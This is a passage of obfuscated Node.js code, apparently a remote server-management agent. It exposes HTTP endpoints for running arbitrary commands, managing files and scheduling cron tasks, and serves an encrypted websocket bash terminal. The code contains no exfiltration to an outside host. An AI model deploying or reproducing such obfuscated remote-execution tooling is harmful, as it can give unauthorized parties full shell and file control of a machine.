        };
    }
    static async [a0T(0x1b0)]() {
        const bc = a0T, a = { 'zCwXt': bc(0x1e1) }, b = [];
        for (let c = 0x0; c < a0E[bc(0x11f)][bc(0x161)]; c++) {
            const d = a0E[bc(0x11f)][c], f = await a0I[bc(0xed)](d), g = this[bc(0xc0)](d, f['result'], f[bc(0x2b4)], a['zCwXt']);
            this[bc(0xde)](a0E[bc(0x90)], g), b['push']({
                'cmd': d,
                'exitcode': f['exitcode'],
                'output': f[bc(0x382)],
                'timeout': f[bc(0x2e2)]
            });
        }
        return a0E['InitTask'] = ![], {
            'status': 'ok',
            'executed': b[bc(0x161)],
            'results': b
        };
    }
}
let a0L = null, a0M = null;
const a0N = new Promise((a, b) => {
    const bd = a0T, c = {
            'DPqlu': bd(0x351),
            'xjEuI': function (d) {
                return d();
            },
            'cAOEa': bd(0x1dc),
            'OaCWS': function (d) {
                return d();
            },
            'qNcoH': function (d, f) {
                return d(f);
            },
            'Erdvv': bd(0x2b9)
        };
    try {
        c[bd(0x19f)](a0r, function (d) {
            const be = bd;
            if (!d) {
                a0M = new Error(c['DPqlu']), a0u[be(0x1a0)]('[WARN]\x20Noise\x20WASM\x20module\x20failed\x20to\x20load:', a0M[be(0x34f)]), c[be(0x173)](a);
                return;
            }
            a0L = d, a0u[be(0x31d)](c[be(0xc2)]), c['OaCWS'](a);
        });
    } catch (d) {
        a0M = d, a0u[bd(0x1a0)](c[bd(0x2c4)], d['message']), a();
    }
});
process['on'](a0T(0x100), (a, b) => {
    const bf = a0T, c = { 'hISqC': bf(0x73) };
    a0u[bf(0x15e)](c['hISqC'], a);
}), process['on'](a0T(0x7f), a => {
    const bg = a0T, b = { 'RmItp': 'Uncaught\x20Exception:' };
    a0u[bg(0x15e)](b['RmItp'], a), process[bg(0xcc)](0x1);
});
function a0b(a, b) {
    a = a - 0x6c;
    const c = a0a();
    let d = c[a];
    if (a0b['aAqntR'] === undefined) {
        var e = function (i) {
            const j = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let l = '', m = '';
            for (let n = 0x0, o, p, q = 0x0; p = i['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? l += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                p = j['indexOf'](p);
            }
            for (let r = 0x0, s = l['length']; r < s; r++) {
                m += '%' + ('00' + l['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(m);
        };
        a0b['SPwEGT'] = e, a0b['dwXbdT'] = {}, a0b['aAqntR'] = !![];
    }
    const f = c[0x0], g = a + f, h = a0b['dwXbdT'][g];
    return !h ? (d = a0b['SPwEGT'](d), a0b['dwXbdT'][g] = d) : d = h, d;
}
class a0O {
    constructor(a, b, c) {
        const bh = a0T, d = { 'hhwAn': '5|0|2|4|6|3|1' }, f = d[bh(0x2ba)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[bh(0x1fa)] = b;
                continue;
            case '1':
                this[bh(0x10a)] = null;
                continue;
            case '2':
                this[bh(0x1f4)] = c;
                continue;
            case '3':
                this[bh(0x12a)] = null;
                continue;
            case '4':
                this[bh(0x238)] = ![];
                continue;
            case '5':
                this[bh(0x383)] = a;
                continue;
            case '6':
                this['hs'] = null;
                continue;
            }
            break;
        }
    }
    async [a0T(0x24c)]() {
        const bi = a0T, a = {
                'iWcQw': 'kisama_terminal_v1',
                'ZhONp': bi(0x1dd)
            };
        await a0N;
        if (!a0L)
            throw a0M || new Error(bi(0x15c));
        const b = a0L, c = this[bi(0x383)] ? b[bi(0x23c)]['NOISE_ROLE_INITIATOR'] : b[bi(0x23c)][bi(0xc4)];
        this['hs'] = b[bi(0x2e4)]('Noise_XX_25519_ChaChaPoly_BLAKE2s', c);
        const d = Buffer['from'](a[bi(0x92)]), f = this[bi(0x1fa)] ? Buffer[bi(0x34a)](this[bi(0x1fa)], a[bi(0x19a)]) : null, g = this[bi(0x1f4)] ? Buffer[bi(0x34a)](this['expectedRemotePubB64'], a[bi(0x19a)]) : null;
        this['hs'][bi(0x17f)](d, f, g, null);
    }
    [a0T(0x22a)](a) {
        const bj = a0T, b = {
                'QIZFg': function (d, f) {
                    return d === f;
                },
                'pogZA': function (d, f) {
                    return d === f;
                },
                'IiUEt': function (d, f) {
                    return d === f;
                }
            };
        if (this[bj(0x238)])
            return Buffer[bj(0x358)](0x0);
        const c = a0L;
        a && a[bj(0x161)] > 0x0 && b[bj(0x205)](this['hs'][bj(0xa3)](), c[bj(0x23c)]['NOISE_ACTION_READ_MESSAGE']) && this['hs'][bj(0x252)](a);
        if (b[bj(0x2ac)](this['hs'][bj(0xa3)](), c['constants'][bj(0x34b)]))
            return this[bj(0xe7)](), Buffer[bj(0x358)](0x0);
        if (b[bj(0x27e)](this['hs'][bj(0xa3)](), c[bj(0x23c)]['NOISE_ACTION_WRITE_MESSAGE'])) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return this['hs'][bj(0xa3)]() === c[bj(0x23c)][bj(0x34b)] && this['_splitAndFinish'](), Buffer['from'](d);
        }
        return Buffer[bj(0x358)](0x0);
    }
    [a0T(0xe7)]() {
        const bk = a0T, a = this['hs']['Split']();
        this[bk(0x12a)] = a[0x0], this[bk(0x10a)] = a[0x1], this['handshakeFinished'] = !![];
        try {
            if (this['hs'])
                this['hs'][bk(0xd9)]();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0T(0x288)](a) {
        const bl = a0T, b = { 'gAwwo': bl(0x15d) };
        if (!this['handshakeFinished'])
            throw new Error(b['gAwwo']);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[bl(0x34a)](this[bl(0x12a)]['EncryptWithAd'](c, d));
    }
    ['decrypt'](a) {
        const bm = a0T, b = { 'EQtXO': bm(0x267) };
        if (!this['handshakeFinished'])
            throw new Error(b[bm(0x135)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this[bm(0x10a)][bm(0x271)](c, d));
    }
    [a0T(0xd9)]() {
        const bn = a0T;
        try {
            if (this[bn(0x12a)])
                this['sendCipher'][bn(0xd9)]();
        } catch (a) {
        }
        try {
            if (this[bn(0x10a)])
                this[bn(0x10a)][bn(0xd9)]();
        } catch (b) {
        }
        try {
            if (this['hs'])
                this['hs'][bn(0xd9)]();
        } catch (c) {
        }
        this[bn(0x12a)] = null, this[bn(0x10a)] = null, this['hs'] = null;
    }
}
class a0P {
    constructor() {
        const bo = a0T, a = {
                'TPmqh': bo(0x30c),
                'MrkDr': bo(0x231)
            }, b = a[bo(0x1ed)][bo(0x36d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bo(0x1e3)] = a0E[bo(0x24a)][bo(0x371)][bo(0x1bf)];
                continue;
            case '1':
                this[bo(0x1ee)] = [];
                continue;
            case '2':
                this[bo(0x13c)] = null;
                continue;
            case '3':
                this['AGENT_PRIVATE_KEY'] = a0E['NOISE_KEYS_INTERNAL'][bo(0x305)][bo(0x270)];
                continue;
            case '4':
                this[bo(0x16b)] = null;
                continue;
            case '5':
                this[bo(0x33b)] = !![];
                continue;
            case '6':
                this[bo(0x236)] = [];
                continue;
            case '7':
                this[bo(0x1d6)] = null;
                continue;
            case '8':
                this[bo(0xe5)] = new a0O(![], this[bo(0x366)], this[bo(0x1e3)]);
                continue;
            case '9':
                this['phase'] = a['MrkDr'];
                continue;
            }
            break;
        }
    }
    async [a0T(0x19d)]() {
        const bp = a0T, a = {
                'OtuwA': function (b, c) {
                    return b === c;
                }
            };
        this[bp(0x16b)] && a0u[bp(0xf0)]('[' + this[bp(0x16b)] + ']\x20执行终端资源清理...');
        if (this[bp(0x13c)]) {
            try {
                this[bp(0x13c)]['kill']();
            } catch (b) {
            }
            this[bp(0x13c)] = null;
        }
        if (this['cipher'])
            this['cipher'][bp(0xd9)]();
        if (this[bp(0x1d6)])
            try {
                a[bp(0x251)](this[bp(0x1d6)][bp(0x380)], this['websocket']['OPEN']) && this[bp(0x1d6)][bp(0x2e1)](0x3e8, bp(0x2b3));
            } catch (c) {
            } finally {
                this[bp(0x1d6)] = null;
            }
    }
    [a0T(0x12e)](a) {
        const bq = a0T, b = {
                'KosKC': function (c, d) {
                    return c > d;
                },
                'EBeue': function (c, d) {
                    return c(d);
                },
                'jqLUY': function (c, d) {
                    return c === d;
                },
                'jgakM': 'terminal'
            };
        if (this[bq(0x70)] === bq(0x231)) {
            if (b[bq(0x334)](this[bq(0x236)][bq(0x161)], 0x0)) {
                const c = this[bq(0x236)][bq(0x7e)]();
                b['EBeue'](c, a);
            } else
                this[bq(0x1ee)][bq(0x15b)](a);
        } else
            b[bq(0x1bc)](this[bq(0x70)], b[bq(0x26a)]) && this[bq(0x1b4)](a);
    }
    async [a0T(0x1af)]() {
        const br = a0T;
        if (this['msgQueue'][br(0x161)] > 0x0)
            return this[br(0x1ee)]['shift']();
        return new Promise(a => {
            const bs = br;
            this['msgResolvers'][bs(0x15b)](a);
        });
    }
    async ['_doNoiseHandshake'](a) {
        const bt = a0T, b = {
                'PoIjL': function (c, d) {
                    return c(d);
                },
                'UkASB': bt(0xc8),
                'SNKML': function (c, d) {
                    return c > d;
                },
                'rDNPG': bt(0x2da),
                'yMvDH': function (c, d) {
                    return c(d);
                },
                'YEFRU': bt(0x19b),
                'nPpkr': function (c, d) {
                    return c(d);
                },
                'MwnvF': '加密握手失败'
            };
        b[bt(0x325)](a, b[bt(0x26e)]);
        try {
            await this[bt(0xe5)]['init']();
            const c = await this[bt(0x1af)](), d = this[bt(0xe5)]['processHandshake'](c);
            d && b[bt(0x308)](d[bt(0x161)], 0x0) && this[bt(0x1d6)]['send'](d);
            const f = await this[bt(0x1af)]();
            this[bt(0xe5)][bt(0x22a)](f);
            if (!this[bt(0xe5)][bt(0x238)])
                throw new Error(b[bt(0x384)]);
            b[bt(0x1d4)](a, b[bt(0x26b)]);
        } catch (g) {
            b[bt(0x328)](a, '💥\x20握手失败详情:\x20' + g['message']);
            throw new Error(b['MwnvF']);
        }
    }
    [a0T(0x198)]() {
        const bu = a0T, a = {
                'NOahi': '/bin/bash',
                'KyPUb': bu(0x219),
                'LdPWL': bu(0x21b)
            }, b = [
                a[bu(0x287)],
                a[bu(0x257)],
                a['LdPWL']
            ];
        for (const d of b) {
            if (a0h[bu(0x2d2)](d))
                return d;
        }
        const c = process.env.SHELL;
        if (c && a0h[bu(0x2d2)](c))
            return c;
        return '/bin/sh';
    }
    async [a0T(0x387)](a, b, c) {
        const bv = a0T, d = {
                'PrVAZ': function (g, h) {
                    return g(h);
                },
                'SBUQM': bv(0x394),
                'IOnqJ': '🔐\x20检测到\x20Token，视为\x20WSS\x20链路，跳过\x20Noise'
            };
        this['websocket'] = a, this['requestId'] = b;
        const f = g => a0u[bv(0xf0)](bv(0x323) + b + ']\x20' + g);
        this[bv(0x33b)] = !c, d[bv(0x1a8)](f, this[bv(0x33b)] ? d['SBUQM'] : d[bv(0x33a)]), a['on'](bv(0x34f), g => this[bv(0x12e)](g));
        try {
            this['useNoise'] && await this['_doNoiseHandshake'](f), await this[bv(0x30d)](f);
        } catch (g) {
            f(bv(0x30b) + g['message']), await this[bv(0x19d)]();
        }
    }
    async [a0T(0x30d)](a) {
        const bw = a0T, b = {
                'JFSCk': function (f, g) {
                    return f(g);
                },
                'ahvSV': function (f, g) {
                    return f(g);
                },
                'UJIRb': bw(0x2a3),
                'lZsIH': function (f, g) {
                    return f(g);
                },
                'CGelP': bw(0x292),
                'yiOwG': function (f, g) {
                    return f(g);
                },
                'FzkDO': bw(0x35e),
                'RkpvW': bw(0x204),
                'EcoWG': function (f, g) {
                    return f > g;
                },
                'TCzQw': bw(0x2e1),
                'wdeMb': function (f, g) {
                    return f(g);
                }
            }, c = this['getAvailableShell']();
        b[bw(0x37c)](a, bw(0x261) + c);
        const d = Object[bw(0xa2)]({}, process.env);
        delete d[bw(0x193)], d[bw(0x2be)] = bw(0x292);
        if (!d['LANG'])
            d[bw(0x2f0)] = bw(0x2eb);
        try {
            this[bw(0x13c)] = a0t[bw(0x181)](c, [], {
                'name': b[bw(0x154)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process['cwd'](),
                'env': d
            }), b[bw(0x239)](a, '🚀\x20终端进程已启动\x20(PID:\x20' + (this['ptyProcess'][bw(0x1fe)] || b['FzkDO']) + ')'), this[bw(0x70)] = b[bw(0x17c)];
            while (b['EcoWG'](this['msgQueue'][bw(0x161)], 0x0)) {
                const f = this[bw(0x1ee)][bw(0x7e)]();
                this[bw(0x1b4)](f);
            }
            this['ptyProcess'][bw(0x24d)](g => {
                const bx = bw;
                try {
                    let h = Buffer[bx(0x34a)](g, 'utf-8');
                    this[bx(0x33b)] && this[bx(0xe5)] && this[bx(0xe5)]['handshakeFinished'] && (h = this[bx(0xe5)]['encrypt'](h)), this[bx(0x1d6)]['readyState'] === 0x1 && this['websocket'][bx(0xdf)](h);
                } catch (i) {
                }
            }), this[bw(0x13c)]['onExit'](({
                exitCode: g,
                signal: h
            }) => {
                const by = bw;
                b['JFSCk'](a, '🔌\x20终端进程退出\x20(Code:\x20' + g + by(0x1df) + h + ')'), this['cleanup']();
            }), this[bw(0x1d6)]['on'](b[bw(0x280)], () => {
                const bz = bw;
                b[bz(0x18a)](a, b[bz(0x30e)]), this[bz(0x19d)]();
            });
        } catch (g) {
            b[bw(0x24e)](a, bw(0x11a) + g[bw(0x34f)]), await this[bw(0x19d)]();
            throw g;
        }
    }
    [a0T(0x1b4)](a) {
        const bA = a0T, b = {
                'AYlya': bA(0x374),
                'KPCfb': bA(0x2df),
                'OEuQI': 'resize',
                'jfUOm': function (c, d) {
                    return c === d;
                },
                'VzAhR': function (c, d) {
                    return c === d;
                },
                'SSUZr': 'base64'
            };
        if (!this[bA(0x13c)])
            return;
        try {
            const c = Buffer[bA(0x34a)](a);
            let d;
            this[bA(0x33b)] ? d = this['cipher'][bA(0x22f)](c) : d = c;
            let f = ![], g = d[bA(0x195)](b['AYlya']);
            if (g['trim']()['startsWith']('{'))
                try {
                    const h = JSON[bA(0x37e)](g);
                    f = !![];
                    if (h[bA(0x391)] === b['KPCfb']) {
                        let i = Buffer[bA(0x34a)](JSON[bA(0x1c1)]({ 'type': bA(0x2df) }));
                        if (this[bA(0x33b)])
                            i = this[bA(0xe5)][bA(0x288)](i);
                        this[bA(0x1d6)][bA(0xdf)](i);
                        return;
                    }
                    if (h['type'] === b[bA(0x16c)]) {
                        this[bA(0x13c)][bA(0x23a)](h[bA(0xf1)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (b[bA(0x348)](h[bA(0x391)], 'input') && h[bA(0x32b)] !== undefined) {
                        let j = b[bA(0x2d5)](h[bA(0x12b)], b[bA(0x1c5)]) ? Buffer[bA(0x34a)](h[bA(0x32b)], b['SSUZr'])[bA(0x195)](b[bA(0x377)]) : h[bA(0x32b)];
                        this[bA(0x13c)][bA(0x1c7)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this['ptyProcess'][bA(0x1c7)](d[bA(0x195)](bA(0x374)));
        } catch (l) {
            a0u[bA(0xf0)]('[终端会话\x20' + this['requestId'] + ']\x20⚠️\x20指令处理异常:\x20' + l['message']);
            if (this['useNoise'])
                this[bA(0x19d)]();
        }
    }
}
async function a0Q(a = {}) {
    const bB = a0T, b = {
            'fAqxo': bB(0x1d5),
            'mrZxc': function (c) {
                return c();
            },
            'heRYc': bB(0x165),
            'QasnA': bB(0x39d),
            'QBqpF': bB(0x2cd),
            'fJTrQ': bB(0x129),
            'nUoSj': bB(0x295),
            'hlOue': 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS',
            'TFUkF': function (c, d) {
                return c === d;
            },
            'GigEk': function (c, d) {
                return c / d;
            },
            'XAclW': bB(0x2d8),
            'VJRNa': function (c, d) {
                return c > d;
            },
            'bCfdp': '📦\x20[Cache]\x20BaseInfo\x20命中有效缓存，直接输出。',
            'bXFdC': 'error',
            'tXdpK': bB(0x7a),
            'CDSUE': function (c, d) {
                return c / d;
            },
            'vqBLQ': function (c, d) {
                return c - d;
            },
            'UaKjj': bB(0x1f3),
            'LFLnf': bB(0x2b5),
            'MDzzw': function (c, d) {
                return c === d;
            },
            'LKIny': bB(0x362),
            'uhEfW': function (c, d) {
                return c(d);
            },
            'ilVqf': 'x-file-path',
            'otmme': 'x-file-name',
            'VnYdr': 'x-chunk-id',
            'YHJQk': function (c, d) {
                return c || d;
            },
            'fsDkp': 'Missing\x20required\x20custom\x20headers:\x20X-File-Path\x20and\x20X-File-Name',
            'WABfx': function (c, d) {
                return c !== d;
            },
            'mmucu': bB(0x1c2),
            'fYMNj': bB(0x1dd),
            'VsziS': bB(0x373),
            'IwmpT': bB(0xfb),
            'OKzUs': 'content-type',
            'sXrxU': function (c, d, f) {
                return c(d, f);
            },
            'Dtfqh': 'Missing\x20request_id',
            'MWpOo': bB(0xff),
            'Qgifh': 'Shutting\x20down...',
            'kybfD': bB(0xd6),
            'BokRI': bB(0x329),
            'AdwGg': bB(0x104),
            'jRYNw': bB(0x105),
            'pLZNl': bB(0x313),
            'XAAwT': bB(0x77),
            'xxPPT': bB(0xe6),
            'bXWSu': bB(0x320),
            'dEOpZ': bB(0x178),
            'cYwTe': bB(0x7d),
            'mnrVz': '/api/file/authority',
            'bbhCr': bB(0x175),
            'TLDRz': '/api/file/download',
            'JcVdy': bB(0x119),
            'wmmRw': '/api/file/new',
            'jiiQV': bB(0x210),
            'bcANm': '/api/task/cron',
            'nXlsQ': '/api/task/status',
            'IxzcN': bB(0x23e),
            'XaxrL': bB(0x294),
            'OPenF': bB(0x2c1),
            'UyJsz': '/api/task/onetime/execute',
            'DhtvV': bB(0x141),
            'PxxJm': '/api/ws/*',
            'gaVoN': bB(0x1ad),
            'FaoSt': 'SIGINT\x20handler\x20registered',
            'vPabe': bB(0x190)
        };
    try {
        const c = await import(bB(0x381));
        a0s = c[bB(0xf2)], a0u[bB(0x31d)](b[bB(0x31c)]), a0E['merge'](a), a0u[bB(0x31d)](b[bB(0x2c0)]), a0E[bB(0xc1)](), a0u[bB(0x31d)](b[bB(0xca)]), a0u[bB(0x31d)](b[bB(0x34c)]);
        const d = new a0F(a0E[bB(0x235)], a0E['ECIES_PUBLIC_KEY_PEM']);
        a0u['debug'](bB(0x9f)), a0u['debug'](b[bB(0x116)]);
        const f = new a0H();
        a0u[bB(0x31d)](b[bB(0x33f)]), a0u['debug'](bB(0x242));
        const g = b['mrZxc'](a0f);
        b[bB(0x378)](a0q, g), a0u['debug'](b[bB(0x1f8)]), g[bB(0x155)]((i, j, k) => {
            const bC = bB, l = b['fAqxo']['split']('|');
            let m = 0x0;
            while (!![]) {
                switch (l[m++]) {
                case '0':
                    b['mrZxc'](k);
                    continue;
                case '1':
                    j[bC(0x208)](b['heRYc'], b[bC(0x247)]);
                    continue;
                case '2':
                    j[bC(0x208)](b[bC(0x1d3)], b[bC(0x29b)]);
                    continue;
                case '3':
                    j[bC(0x208)](b[bC(0x335)], b[bC(0xa4)]);
                    continue;
                case '4':
                    if (b['TFUkF'](i[bC(0x96)], 'OPTIONS'))
                        return j[bC(0x240)](0xc8)[bC(0x311)]();
                    continue;
                case '5':
                    j[bC(0x208)](bC(0x275), '*');
                    continue;
                }
                break;
            }
        }), g['use'](a0f['text']({
            'type': i => i[bB(0x98)] !== bB(0x2bc),
            'limit': bB(0x361)
        })), g[bB(0x155)](a0f['urlencoded']({ 'extended': !![] })), g[bB(0x155)](a0G(d)), a0u[bB(0x31d)](bB(0x18c)), g[bB(0x32d)](b[bB(0x168)], async (i, j) => {
            const bE = bB, k = {
                    'pDopj': function (l, m) {
                        const bD = a0b;
                        return b[bD(0x199)](l, m);
                    },
                    'MiZGp': b['XAclW']
                };
            try {
                const l = Math[bE(0x18d)](b['GigEk'](Date[bE(0x1b5)](), 0x3e8));
                !a0E['_baseinfo_cache'] || b[bE(0x2b7)](l - a0E['_baseinfo_cache_time'], a0E[bE(0x2fe)]) ? (!a0E[bE(0x2af)] && (a0E[bE(0x2af)] = f[bE(0x1f9)]()['then'](n => {
                    const bF = bE;
                    return a0E[bF(0x20d)] = n, a0E[bF(0xb8)] = Math[bF(0x18d)](k[bF(0x379)](Date['now'](), 0x3e8)), a0E[bF(0x2af)] = null, a0u[bF(0x31d)](k[bF(0x1b7)]), n;
                })[bE(0x37b)](n => {
                    a0E['_baseinfo_fetch_promise'] = null;
                    throw n;
                })), await a0E[bE(0x2af)]) : a0u[bE(0x31d)](b[bE(0xdd)]);
                const m = { ...a0E[bE(0x20d)] };
                b[bE(0x7b)](i[bE(0x355)], ![]) ? (m[bE(0x7c)] = null, m['noise_key'] = null) : (m[bE(0x7c)] = a0E[bE(0x2ec)], m[bE(0x363)] = a0E[bE(0x2f4)]), j[bE(0x2e6)](m);
            } catch (n) {
                j[bE(0x240)](0x1f4)[bE(0x2e6)]({
                    'status': b[bE(0x37f)],
                    'message': n['message']
                });
            }
        }), g[bB(0x32d)](b[bB(0xd7)], async (i, j) => {
            const bG = bB;
            try {
                const k = Math['floor'](b[bG(0x214)](Date[bG(0x1b5)](), 0x3e8));
                !a0E[bG(0x228)] || b[bG(0x2b7)](b[bG(0x17e)](k, a0E[bG(0xb1)]), a0E['STATUS_CACHE_TTL']) ? (!a0E[bG(0x25d)] && (a0E[bG(0x25d)] = f['getRealtimeInfo']()['then'](m => {
                    const bH = bG;
                    return a0E['_status_cache'] = m, a0E['_status_cache_time'] = Math[bH(0x18d)](Date['now']() / 0x3e8), a0E[bH(0x25d)] = null, a0u[bH(0x31d)](b[bH(0x356)]), m;
                })[bG(0x37b)](m => {
                    const bI = bG;
                    a0E[bI(0x25d)] = null;
                    throw m;
                })), await a0E['_status_fetch_promise']) : a0u[bG(0x31d)](b[bG(0x21d)]);
                const l = { ...a0E[bG(0x228)] };
                j[bG(0x2e6)](l);
            } catch (m) {
                j[bG(0x240)](0x1f4)[bG(0x2e6)]({
                    'status': b[bG(0x37f)],
                    'message': m[bG(0x34f)]
                });
            }
        }), g['post'](bB(0x298), async (i, j) => {
            const bJ = bB;
            try {
                let k = null;
                if (typeof i[bJ(0x26d)] === b['LFLnf'])
                    k = i[bJ(0x26d)][bJ(0x143)]();
                else
                    i[bJ(0x26d)] && b[bJ(0x2f8)](typeof i[bJ(0x26d)], b[bJ(0x284)]) && (k = i[bJ(0x26d)][bJ(0x2e8)] || '');
                if (!k)
                    return j['status'](0x190)[bJ(0x2e6)]({
                        'status': 'error',
                        'message': bJ(0x2cf)
                    });
                const l = await a0I['execute'](k, {
                    'cwd': i[bJ(0x26d)][bJ(0x2ef)],
                    'env': i[bJ(0x26d)][bJ(0xf6)],
                    'timeout': a0E[bJ(0x220)]
                });
                j[bJ(0x2e6)](l);
            } catch (m) {
                j[bJ(0x240)](0x1f4)[bJ(0x2e6)]({
                    'status': b[bJ(0x37f)],
                    'message': m[bJ(0x34f)]
                });
            }
        }), g[bB(0x321)](b[bB(0x20c)], async (i, j) => {
            const bK = bB;
            try {
                const k = await a0J[bK(0x269)](i[bK(0x26d)][bK(0x98)], i['body'][bK(0x296)]);
                j[bK(0x2e6)]({
                    'status': 'ok',
                    'count': k[bK(0x161)],
                    'files': k
                });
            } catch (l) {
                j[bK(0x240)](0x1f4)[bK(0x2e6)]({
                    'status': b[bK(0x37f)],
                    'message': l['message']
                });
            }
        }), g[bB(0x321)](b[bB(0x364)], async (i, j) => {
            const bL = bB;
            try {
                const k = await a0J[bL(0x375)](i['body'][bL(0x38b)] || []);
                j[bL(0x2e6)]({
                    'status': 'ok',
                    'files': k
                });
            } catch (l) {
                j[bL(0x240)](0x1f4)[bL(0x2e6)]({
                    'status': b[bL(0x37f)],
                    'message': l['message']
                });
            }
        }), g[bB(0x2cb)](b[bB(0x364)], async (i, j) => {
            const bM = bB;
            try {
                const k = i['body'][bM(0xc5)] || {}, l = b[bM(0x7b)](i[bM(0x26d)]['recursive'], !![]), m = await a0J['setFilePermissions'](k, l);
                j[bM(0x2e6)](m);
            } catch (n) {
                j[bM(0x240)](0x1f4)['json']({
                    'status': b['bXFdC'],
                    'message': n['message']
                });
            }
        }), g[bB(0x321)](bB(0xe2), async (i, j) => {
            const bN = bB;
            try {
                const k = await a0J[bN(0x324)](i[bN(0x26d)][bN(0x98)]);
                j['json'](k);
            } catch (l) {
                j['status'](0x1f4)[bN(0x2e6)]({
                    'status': b['bXFdC'],
                    'message': l[bN(0x34f)]
                });
            }
        }), g[bB(0x321)](bB(0x1d7), async (i, j) => {
            const bO = bB;
            try {
                const k = await a0J[bO(0x28e)](i['body']['path'], i[bO(0x26d)][bO(0x121)], i[bO(0x26d)][bO(0xda)], i['body'][bO(0x243)], i[bO(0x26d)][bO(0x10d)]);
                j[bO(0x2e6)](k);
            } catch (l) {
                j[bO(0x240)](0x1f4)[bO(0x2e6)]({
                    'status': b[bO(0x37f)],
                    'message': l[bO(0x34f)]
                });
            }
        }), g[bB(0x321)](bB(0x2bc), a0f[bB(0x1a4)]({
            'type': b[bB(0x76)],
            'limit': bB(0x361)
        }), async (i, j) => {
            const bP = bB;
            try {
                const k = b['uhEfW'](decodeURIComponent, i['headers'][b[bP(0x136)]] || ''), l = b[bP(0x378)](decodeURIComponent, i[bP(0x24f)][b[bP(0x18f)]] || ''), m = i['headers'][b[bP(0x197)]], n = i['headers'][bP(0x1cf)];
                if (b[bP(0x1aa)](!k, !l))
                    return j[bP(0x240)](0x190)[bP(0x2e6)]({
                        'status': b[bP(0x37f)],
                        'completed': ![],
                        'message': b[bP(0xa5)]
                    });
                const o = b['WABfx'](m, undefined) ? parseInt(b[bP(0x378)](String, m), 0xa) : null, p = n !== undefined ? parseInt(String(n), 0xa) : null, q = i[bP(0x26d)];
                if (!Buffer['isBuffer'](q))
                    return j[bP(0x240)](0x190)[bP(0x2e6)]({
                        'status': bP(0x15e),
                        'completed': ![],
                        'message': b['mmucu']
                    });
                const r = await a0J[bP(0x222)](k, l, q, o, p);
                j[bP(0x2e6)](r);
            } catch (s) {
                j[bP(0x240)](0x1f4)[bP(0x2e6)]({
                    'status': b[bP(0x37f)],
                    'completed': ![],
                    'message': s[bP(0x34f)]
                });
            }
        }), g['post'](b[bB(0x22d)], async (i, j) => {
            const bQ = bB;
            try {
                const k = await a0J[bQ(0x34e)](i[bQ(0x26d)]['path']), l = Buffer[bQ(0x34a)](k[bQ(0xda)], b[bQ(0x25b)]);
                return j[bQ(0x293)](b[bQ(0x206)], k[bQ(0x9b)][bQ(0x195)]()), j['set'](b[bQ(0x172)], k[bQ(0x98)]), j['set'](b[bQ(0x111)], bQ(0x175)), j[bQ(0xdf)](l);
            } catch (m) {
                j['status'](0x1f4)[bQ(0x2e6)]({
                    'status': b['bXFdC'],
                    'message': m[bQ(0x34f)]
                });
            }
        }), g[bB(0x35c)]('/api/file', async (i, j) => {
            const bR = bB;
            try {
                let k = i[bR(0x26d)][bR(0x38b)];
                if (!k || !Array['isArray'](k)) {
                    k = [];
                    if (i[bR(0x26d)][bR(0x98)])
                        k[bR(0x15b)](i[bR(0x26d)][bR(0x98)]);
                    if (i[bR(0x26d)][bR(0x107)])
                        k[bR(0x15b)](i[bR(0x26d)][bR(0x107)]);
                }
                const l = await a0J[bR(0x2aa)](k);
                j['json']({
                    'status': 'ok',
                    'results': l
                });
            } catch (m) {
                j[bR(0x240)](0x1f4)[bR(0x2e6)]({
                    'status': bR(0x15e),
                    'message': m[bR(0x34f)]
                });
            }
        }), g[bB(0x2cb)](bB(0x1d7), async (i, j) => {
            const bS = bB;
            try {
                const k = await a0J[bS(0x315)](i[bS(0x26d)][bS(0x31b)] || i[bS(0x26d)]);
                j[bS(0x2e6)]({
                    'status': 'ok',
                    'total': k[bS(0x161)],
                    'success': k[bS(0xa9)](l => l['status'] === 'ok')[bS(0x161)],
                    'results': k
                });
            } catch (l) {
                j[bS(0x240)](0x1f4)['json']({
                    'status': b[bS(0x37f)],
                    'message': l[bS(0x34f)]
                });
            }
        }), g[bB(0x321)](b['JcVdy'], async (i, j) => {
            const bT = bB;
            try {
                const k = await a0J[bT(0xf8)](i[bT(0x26d)]);
                j[bT(0x2e6)]({
                    'status': 'ok',
                    'total': k[bT(0x161)],
                    'success': k[bT(0xa9)](l => l['status'] === 'ok')[bT(0x161)],
                    'results': k
                });
            } catch (l) {
                j['status'](0x1f4)[bT(0x2e6)]({
                    'status': b['bXFdC'],
                    'message': l[bT(0x34f)]
                });
            }
        }), g['post'](b[bB(0x399)], async (i, j) => {
            const bU = bB;
            try {
                const k = await a0J[bU(0xe3)](i['body'][bU(0x98)]);
                j[bU(0x2e6)](k);
            } catch (l) {
                j['status'](0x1f4)[bU(0x2e6)]({
                    'status': b[bU(0x37f)],
                    'message': l[bU(0x34f)]
                });
            }
        }), g[bB(0x32d)](b['jiiQV'], (i, j) => {
            const bV = bB;
            j[bV(0x2e6)](a0K[bV(0x1e5)]());
        }), g[bB(0x321)](b[bB(0x1ce)], async (i, j) => {
            const bW = bB;
            try {
                const k = await a0K['setOnetimeTasks'](i[bW(0x26d)]);
                j[bW(0x2e6)](k);
            } catch (l) {
                j['status'](0x1f4)[bW(0x2e6)]({
                    'status': bW(0x15e),
                    'message': l[bW(0x34f)]
                });
            }
        }), g[bB(0x32d)](b[bB(0x234)], (i, j) => {
            const bX = bB;
            j[bX(0x2e6)](a0K['getCronTasks']());
        }), g['post'](bB(0x118), (i, j) => {
            const bY = bB;
            try {
                const k = a0K['setCronTasks'](i[bY(0x26d)]);
                j[bY(0x2e6)](k);
